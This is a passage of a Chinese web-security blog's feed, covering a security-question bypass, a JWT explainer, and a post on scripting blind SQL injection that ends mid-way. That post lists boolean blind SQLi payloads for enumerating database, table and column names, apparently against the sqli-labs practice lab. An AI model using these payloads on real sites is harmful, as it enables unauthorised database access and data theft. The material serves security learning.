则由于数据库里无secQuestion2的字段，那么当我们查询的时候则对应的secQuestion2的值就为none，或者其他的什么    因此，我们可以尝试一下设置：</p><p><img src="http://pic.bamboo22.top/fcaa473f9cc643c8b8478723642cd262.png"><br>将两个问题都改为none</p><p><img src="http://pic.bamboo22.top/image-20230621170933205.png"></p>]]></content>
      
      
      <categories>
          
          <category> web基础漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JWT</title>
      <link href="/2024/01/22/JWT/"/>
      <url>/2024/01/22/JWT/</url>
      
        <content type="html"><![CDATA[<h1 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h1><h2 id="什么是JWT"><a href="#什么是JWT" class="headerlink" title="什么是JWT"></a>什么是JWT</h2><h3 id="JWT介绍"><a href="#JWT介绍" class="headerlink" title="JWT介绍"></a>JWT介绍</h3><blockquote><p>JSON Web Token（JSON Web令牌）</p></blockquote><p><img src="http://pic.bamboo22.top/120.png"></p><p>**JWT(json web token)**是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准。 JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源。比如用户登录。在传统的用户登录认证中，因为http是无状态的，所以都是采用session方式。用户登录成功，服务端会保存一个session，服务端会返回给客户端一个sessionId，客户端会把sessionId保存在cookie中，每次请求都会携带这个sessionId。 </p><p><strong>cookie+session</strong>这种模式通常是保存在内存中，而且服务从单服务到多服务会面临的session共享问题。虽然目前存在使用Redis进行Session共享的机制，但是随着用户量和访问量的增加，Redis中保存的数据会越来越多，开销就会越来越大，多服务间的耦合性也会越来越大，Redis中的数据也很难进行管理，例如当Redis集群服务器出现Down机的情况下，整个业务系统随之将变为不可用的状态。而JWT不是这样的，只需要服务端生成token，客户端保存这个token，每次请求携带这个token，服务端认证解析就可。</p><h3 id="JWT作用："><a href="#JWT作用：" class="headerlink" title="JWT作用："></a>JWT作用：</h3><ul><li>授权：一旦用户登录，每个后续请求将包括JWT，从而允许用户访问该令牌允许的路由，服务和资源。它的开销很小并且可以在不同的域中使用。如：单点登录。</li><li>信息交换：在各方之间安全地传输信息。JWT可进行签名（如使用公钥&#x2F;私钥对)，因此可确保发件人。由于签名是使用标头和有效负载计算的，因此还可验证内容是否被篡改。</li></ul><h3 id="JWT结构解析"><a href="#JWT结构解析" class="headerlink" title="JWT结构解析"></a>JWT结构解析</h3><h4 id="header"><a href="#header" class="headerlink" title="header"></a>header</h4><p>jwt的头部承载两部分信息： </p><ol><li><p>声明类型，这里是jwt </p></li><li><p>声明加密的算法 通常直接使用 HMAC SHA256</p><p>完整的头部就像下面这样的JSON：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span> </span><br><span class="line">    </span><br><span class="line"><span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>然后将头部进行base64加密（该加密是可以对称解密的),构成了第一部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><br></pre></td></tr></table></figure></li></ol><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>载荷就是存放有效信息的地方。这个名字像是特指飞机上承载的货品，这些有效信息包含三个部分：标准中注册的声明、公共的声明、私有的声明。</p><ol><li><p>标准中注册的声明 (建议但不强制使用) ：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">iss<span class="punctuation">:</span> jwt签发者</span><br><span class="line">sub<span class="punctuation">:</span> jwt所面向的用户 </span><br><span class="line">aud<span class="punctuation">:</span> 接收jwt的一方 </span><br><span class="line">exp<span class="punctuation">:</span> jwt的过期时间，这个过期时间必须要大于签发时间</span><br><span class="line">nbf<span class="punctuation">:</span> 定义在什么时间之前，该jwt都是不可用的.</span><br><span class="line">iat<span class="punctuation">:</span> jwt的签发时间</span><br><span class="line">jti<span class="punctuation">:</span> jwt的唯一身份标识，主要用来作为一次性token<span class="punctuation">,</span>从而回避重放攻击。</span><br></pre></td></tr></table></figure></li><li><p>公共的声明 ： 公共的声明可以添加任何的信息，一般添加用户的相关信息或其他业务需要的必要信息.但不建议添加敏感信息，因为该部分在客户端可解密。</p></li><li><p>私有的声明 ： 私有声明是提供者和消费者所共同定义的声明，一般不建议存放敏感信息，因为base64是对称解密的，意味着该部分信息可以归类为明文信息。</p><p>定义一个payload：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span> </span><br><span class="line">   </span><br><span class="line"><span class="attr">&quot;uid&quot;</span><span class="punctuation">:</span><span class="string">&quot;e12a34b56c78d9e0f&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;ramostear&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;role&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>然后将其进行base64加密，得到Jwt的第二部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJvcmciOiLku4rml6XlpLTmnaEiLCJuYW1lIjoiRnJlZeeggeWGnCIsImV4cCI6MTUxNDM1NjEwMywiaWF0IjoxNTE0MzU2MDQzLCJhZ2UiOiIyOCJ9</span><br></pre></td></tr></table></figure></li></ol><h4 id="signature"><a href="#signature" class="headerlink" title="signature"></a>signature</h4><p> jwt的第三部分是一个签证信息，这个签证信息由三部分组成：header (base64后的)、 payload (base64后的)、secret。 这个部分需要base64加密后的header和base64加密后的payload使用。连接组成的字符串，然后通过header中声明的加密方式进行加盐secret组合加密，然后就构成了jwt的第三部分：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">base64UrlEncode(header) + <span class="string">&quot;.&quot;</span> +</span><br><span class="line">base64UrlEncode(payload)<span class="punctuation">,</span></span><br><span class="line">secret)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">49UF72vSkj-sA4aHHiYN5eoZ9Nb4w5Vb45PsLF7x_NY</span><br></pre></td></tr></table></figure><p>密钥secret是保存在服务端的，服务端会根据这个密钥进行生成token和验证，所以需要保护好。</p><p>下图为一个JWT生成流程示例：</p><p><img src="http://pic.bamboo22.top/image-20230619102906786.png"></p><h3 id="JWT认证流程"><a href="#JWT认证流程" class="headerlink" title="JWT认证流程"></a>JWT认证流程</h3><p>在身份验证中，当用户成功登录系统时，授权服务器将会把 JSON Web Token 返回给客户端，用户需要将此凭证信息存储在本地(cookie或浏览器缓存)。当用户发起新的请求时，需要在请求头中附带此凭证信息，当服务器接收到用户请求时，会先检查请求头中有无凭证，是否过期，是否有效。如果凭证有效，将放行请求；若凭证非法或者过期，服务器将回跳到认证中心，重新对用户身份进行验证，直至用户身份验证成功。以访问 API 资源为例，下图显示了获取并使用 JWT 的基本流程：</p><p><img src="http://pic.bamboo22.top/1200-16871417935843.png"></p><ol><li>用户使用账号和密码登录，调用后端登录接口；</li><li>后端登录程序生成jwt(注意这里小写指的是具体的token)，这一步通常是由jwt插件完成的，我们只需要配置jwt加密密钥、token刷新时间、token有效时间；</li><li>后端返回jwt给前端；</li><li>前端之后的请求直接带上token即可，只要在token的有效期内；</li><li>后端收到前端的请求，会验证token的合法性、有效性，验证通过之后处理请求；</li><li>后端发送响应给前端。</li></ol><h3 id="JWT的利弊"><a href="#JWT的利弊" class="headerlink" title="JWT的利弊"></a>JWT的利弊</h3><p>1、 使用 JWT 的优势 使用 JSON Web Token 保护应用安全，你至少可以获得以下几个优势：</p><ul><li>更少的<a href="https://cloud.tencent.com/solution/database?from=20065&from_column=20065">数据库</a>连接：因其基于算法来实现身份认证，在使用 JWT 时查询数据的次数更少(更少的数据连接不等于不连接数据库)，可以获得更快的系统响应时间。构建更简单：如果你的应用程序本身是无状态的，那么选择 JWT 可以加快系统构建过程。 </li><li>跨服务调用：你可以构建一个认证中心来处理用户身份认证和发放签名的工作，其他应用服务在后续的用户请求中不需要(理论上)在询问认证中心，可使用自有的公钥对用户签名进行验证。 </li><li>无状态：你不需要向传统的 Web 应用那样将用户状态保存于 Session 中。</li></ul><p>2、使用 JWT 的弊端</p><ul><li>严重依赖于秘钥：JWT 的生成与解析过程都需要依赖于秘钥(Secret)，且都以硬编码的方式存在于系统中(也有放在外部配置文件中的)。如果秘钥不小心泄露，系统的安全性将收到威胁。 </li><li>服务端无法管理客户端的信息：如果用户身份发生异常(信息泄露，或者被攻击)，服务端很难向操作 Session 那样主动将异常用户进行隔离。 </li><li>服务端无法主动推送消息：服务端由于是无状态的，他将无法使用像 Session 那样的方式推送消息到客户端，例如过期时间将至，服务端无法主动为用户续约，需要客户端向服务端发起续约请求。 </li><li>冗余的数据开销：一个 JWT 签名的大小要远比一个 Session ID 长很多，如果你对有效载荷(payload)中的数据不做有效控制，其长度会成几何倍数增长，且在每一次请求时都需要负担额外的网络开销。 </li><li>JSON Web Token 很流行，但是它相比于 Session,OIDC(OpenId Connect)等技术还比较新，支持 JSON Web Token 的库还比较少，而且 JWT 也并非比传统 Session 更安全，他们都没有解决 CSRF 和 XSS 的问题。因此，在决定使用 JWT 前，你需要仔细考虑其利弊。</li></ul>]]></content>
      
      
      <categories>
          
          <category> web基础漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL盲注脚本编写</title>
      <link href="/2024/01/22/SQL%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/"/>
      <url>/2024/01/22/SQL%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL盲注脚本编写"><a href="#SQL盲注脚本编写" class="headerlink" title="SQL盲注脚本编写"></a>SQL盲注脚本编写</h1><h2 id="Python-requests-模块"><a href="#Python-requests-模块" class="headerlink" title="Python requests 模块"></a>Python requests 模块</h2><p>Python requests 是一个常用的 HTTP 请求库，可以方便地向网站发送 HTTP 请求，并获取响应结果。</p><p>requests 模块比 <a href="https://www.runoob.com/python3/python-urllib.html">urllib</a> 模块更简洁。</p><p>使用 requests 发送 HTTP 请求需要先导入 requests 模块：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br></pre></td></tr></table></figure><p>导入后就可以发送 HTTP 请求，使用 requests 提供的方法向指定 URL 发送 HTTP 请求，例如：</p><p><strong>实例:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">\<span class="comment"># 导入 requests 包</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">\<span class="comment"># 发送请求</span></span><br><span class="line">x = requests.get(<span class="string">&#x27;https://www.runoob.com/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">\<span class="comment"># 返回网页内容</span></span><br><span class="line"><span class="built_in">print</span>(x.text)</span><br></pre></td></tr></table></figure><p>每次调用 requests 请求之后，会返回一个 response 对象，该对象包含了具体的响应信息，如状态码、响应头、响应内容等：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(response.status_code)  <span class="comment"># 获取响应状态码</span></span><br><span class="line"><span class="built_in">print</span>(response.headers)  <span class="comment"># 获取响应头</span></span><br><span class="line"><span class="built_in">print</span>(response.content)  <span class="comment"># 获取响应内容</span></span><br></pre></td></tr></table></figure><p><strong>更多响应信息如下：</strong></p><table><thead><tr><th align="left">属性或方法</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">apparent_encoding</td><td align="left">编码方式</td></tr><tr><td align="left">close()</td><td align="left">关闭与服务器的连接</td></tr><tr><td align="left">content</td><td align="left">返回响应的内容，以字节为单位</td></tr><tr><td align="left">cookies</td><td align="left">返回一个 CookieJar 对象，包含了从服务器发回的 cookie</td></tr><tr><td align="left">elapsed</td><td align="left">返回一个 timedelta 对象，包含了从发送请求到响应到达之间经过的时间量，可以用于测试响应速度。比如 r.elapsed.microseconds 表示响应到达需要多少微秒。</td></tr><tr><td align="left">encoding</td><td align="left">解码 r.text 的编码方式</td></tr><tr><td align="left">headers</td><td align="left">返回响应头，字典格式</td></tr><tr><td align="left">history</td><td align="left">返回包含请求历史的响应对象列表（url）</td></tr><tr><td align="left">is_permanent_redirect</td><td align="left">如果响应是永久重定向的 url，则返回 True，否则返回 False</td></tr><tr><td align="left">is_redirect</td><td align="left">如果响应被重定向，则返回 True，否则返回 False</td></tr><tr><td align="left">iter_content()</td><td align="left">迭代响应</td></tr><tr><td align="left">iter_lines()</td><td align="left">迭代响应的行</td></tr><tr><td align="left">json()</td><td align="left">返回结果的 JSON 对象 (结果需要以 JSON 格式编写的，否则会引发错误)</td></tr><tr><td align="left">links</td><td align="left">返回响应的解析头链接</td></tr><tr><td align="left">next</td><td align="left">返回重定向链中下一个请求的 PreparedRequest 对象</td></tr><tr><td align="left">ok</td><td align="left">检查 “status_code” 的值，如果小于400，则返回 True，如果不小于 400，则返回 False</td></tr><tr><td align="left">raise_for_status()</td><td align="left">如果发生错误，方法返回一个 HTTPError 对象</td></tr><tr><td align="left">reason</td><td align="left">响应状态的描述，比如 “Not Found” 或 “OK”</td></tr><tr><td align="left">request</td><td align="left">返回请求此响应的请求对象</td></tr><tr><td align="left">status_code</td><td align="left">返回 http 的状态码，比如 404 和 200（200 是 OK，404 是 Not Found）</td></tr><tr><td align="left">text</td><td align="left">返回响应的内容，unicode 类型数据</td></tr><tr><td align="left">url</td><td align="left">返回响应的 URL</td></tr></tbody></table><p><strong>实例：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入 requests 包</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送请求</span></span><br><span class="line">x = requests.get(<span class="string">&#x27;https://www.runoob.com/&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回 http 的状态码</span></span><br><span class="line"><span class="built_in">print</span>(x.status_code)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 响应状态的描述</span></span><br><span class="line"><span class="built_in">print</span>(x.reason)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回编码</span></span><br><span class="line"><span class="built_in">print</span>(x.apparent_encoding)</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">200</span></span><br><span class="line">OK</span><br><span class="line">utf-<span class="number">8</span></span><br></pre></td></tr></table></figure><p><strong>requests 方法：</strong></p><table><thead><tr><th align="left">方法</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">delete(<em>url</em>, <em>args</em>)</td><td align="left">发送 DELETE 请求到指定 url</td></tr><tr><td align="left">get(<em>url</em>, <em>params, args</em>)</td><td align="left">发送 GET 请求到指定 url</td></tr><tr><td align="left">head(<em>url</em>, <em>args</em>)</td><td align="left">发送 HEAD 请求到指定 url</td></tr><tr><td align="left">patch(<em>url</em>, <em>data, args</em>)</td><td align="left">发送 PATCH 请求到指定 url</td></tr><tr><td align="left">post(<em>url</em>, <em>data, json, args</em>)</td><td align="left">发送 POST 请求到指定 url</td></tr><tr><td align="left">put(<em>url</em>, <em>data, args</em>)</td><td align="left">发送 PUT 请求到指定 url</td></tr><tr><td align="left">request(<em>method</em>, <em>url</em>, <em>args</em>)</td><td align="left">向指定的 url 发送指定的请求方法</td></tr></tbody></table><p>使用 requests.request() 发送 get 请求：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入 requests 包</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送请求</span></span><br><span class="line">x = requests.request(<span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;https://www.runoob.com/&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回网页内容</span></span><br><span class="line"><span class="built_in">print</span>(x.status_code)</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">200</span></span><br></pre></td></tr></table></figure><p>设置请求头：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入 requests 包</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">kw = &#123;<span class="string">&#x27;s&#x27;</span>:<span class="string">&#x27;python 教程&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置请求头</span></span><br><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36&quot;</span>&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment"># params 接收一个字典或者字符串的查询参数，字典类型自动转换为url编码，不需要urlencode()</span></span><br><span class="line">response = requests.get(<span class="string">&quot;https://www.runoob.com/&quot;</span>, params = kw, headers = headers)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看响应状态码</span></span><br><span class="line"><span class="built_in">print</span> (response.status_code)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看响应头部字符编码</span></span><br><span class="line"><span class="built_in">print</span> (response.encoding)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看完整url地址</span></span><br><span class="line"><span class="built_in">print</span> (response.url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看响应内容，response.text 返回的是Unicode格式的数据</span></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">200</span></span><br><span class="line">UTF-<span class="number">8</span></span><br><span class="line">https://www.runoob.com/?s=python+%E6%<span class="number">95</span>%<span class="number">99</span>%E7%A8%8B</span><br><span class="line"></span><br><span class="line"><span class="meta">... </span>其他内容...</span><br></pre></td></tr></table></figure><p>post() 方法可以发送 POST 请求到指定 url，一般格式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.post(url, data=&#123;key: value&#125;, json=&#123;key: value&#125;, args)</span><br></pre></td></tr></table></figure><ul><li><strong>url</strong> 请求 url。</li><li><strong>data</strong> 参数为要发送到指定 url 的字典、元组列表、字节或文件对象。</li><li><strong>json</strong> 参数为要发送到指定 url 的 JSON 对象。</li><li><strong>args</strong> 为其他参数，比如 cookies、headers、verify等。</li></ul><p>实例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入 requests 包</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送请求</span></span><br><span class="line">x = requests.post(<span class="string">&#x27;https://www.runoob.com/try/ajax/demo_post.php&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回网页内容</span></span><br><span class="line"><span class="built_in">print</span>(x.text)</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;p style=<span class="string">&#x27;color:red;&#x27;</span>&gt;本内容是使用 POST 方法请求的。&lt;/p&gt;&lt;p style=<span class="string">&#x27;color:red;&#x27;</span>&gt;请求时间：</span><br><span class="line"><span class="number">2022</span>-05-<span class="number">26</span> <span class="number">17</span>:<span class="number">30</span>:<span class="number">47</span>&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>post请求带参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入 requests 包</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 表单参数，参数名为 fname 和 lname</span></span><br><span class="line">myobj = &#123;<span class="string">&#x27;fname&#x27;</span>: <span class="string">&#x27;RUNOOB&#x27;</span>,<span class="string">&#x27;lname&#x27;</span>: <span class="string">&#x27;Boy&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送请求</span></span><br><span class="line">x = requests.post(<span class="string">&#x27;https://www.runoob.com/try/ajax/demo_post2.php&#x27;</span>, data = myobj)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回网页内容</span></span><br><span class="line"><span class="built_in">print</span>(x.text)</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p style=<span class="string">&#x27;color:red;&#x27;</span>&gt;你好，RUNOOB Boy，今天过得怎么样？&lt;/p&gt;</span><br></pre></td></tr></table></figure><p><strong>附加请求参数</strong></p><p>发送请求我们可以在请求中附加额外的参数，例如请求头、查询参数、请求体等，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0&#x27;</span>&#125;  <span class="comment"># 设置请求头</span></span><br><span class="line">params = &#123;<span class="string">&#x27;key1&#x27;</span>: <span class="string">&#x27;value1&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>: <span class="string">&#x27;value2&#x27;</span>&#125;  <span class="comment"># 设置查询参数</span></span><br><span class="line">data = &#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;example&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123456&#x27;</span>&#125;  <span class="comment"># 设置请求体</span></span><br><span class="line">response = requests.post(<span class="string">&#x27;https://www.runoob.com&#x27;</span>, headers=headers, params=params, data=data)</span><br></pre></td></tr></table></figure><p>上述代码发送一个 POST 请求，并附加了请求头、查询参数和请求体。</p><p>除了基本的 GET 和 POST 请求外，requests 还支持其他 HTTP 方法，如 PUT、DELETE、HEAD、OPTIONS 等。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>我们的脚本首先要实现的是向指定页面以指定方式发送请求，所以要用到一下几个东西</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">\<span class="comment"># 发送请求</span></span><br><span class="line">x = requests.get(<span class="string">&#x27;https://www.runoob.com/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">\<span class="comment"># 返回网页内容</span></span><br><span class="line"><span class="built_in">print</span>(x.text)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">text</th><th>返回响应的内容，unicode 类型数据</th></tr></thead></table><p><code>text</code>返回响应的内容，在布尔盲注时，我们根据响应的内容的长度来判断页面回显的真假</p><p>有了这些知识，我们就可以继续脚本的编写了</p><h2 id="手动盲注payload"><a href="#手动盲注payload" class="headerlink" title="手动盲注payload"></a>手动盲注payload</h2><p>手动盲注的payload是脚本的核心，接下来的脚本的SQL注入语句都在这里</p><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>先判断库名长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length(database())=1 --+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> length(database())<span class="operator">=</span><span class="number">2</span> <span class="comment">--+</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length(database())=3 --+</span></span><br><span class="line"><span class="string">......</span></span><br></pre></td></tr></table></figure><p>猜解库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (substr(database(),1,1))=&quot;a&quot; --+</span></span><br></pre></td></tr></table></figure><p>获取表的数量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (select count(*)table_name from information_schema.tables where table_schema=&#x27;security&#x27;)=4 --+</span><br></pre></td></tr></table></figure><p>获取表的长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select LENGTH(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; limit 1,1)=8 --+</span></span><br></pre></td></tr></table></figure><p>获取表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (substr((select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; limit 0,1),1,1))=101 --+</span></span><br></pre></td></tr></table></figure><p>获取列数量</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select count(column_name) from information_schema.cloumns where table_schema=&#x27;</span>security<span class="string">&#x27; and table_name=&#x27;</span>users<span class="string">&#x27;)=3 --+</span></span><br></pre></td></tr></table></figure><p>获取列长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select length(column_name) from information_schema.columns where table_schema=&#x27;</span>security<span class="string">&#x27; and table_name=&#x27;</span>users<span class="string">&#x27; limit 0,1)=2 --+</span></span><br></pre></td></tr></table></figure><p>获取列名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and substr((select column_name from information_schema.columns where table_schema=&#x27;</span>security<span class="string">&#x27; and table_name=&#x27;</span>users<span class="string">&#x27; limit 0,1),1,1)=105 --+</span></span><br></pre></td></tr></table></figure><p>获数据数量</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 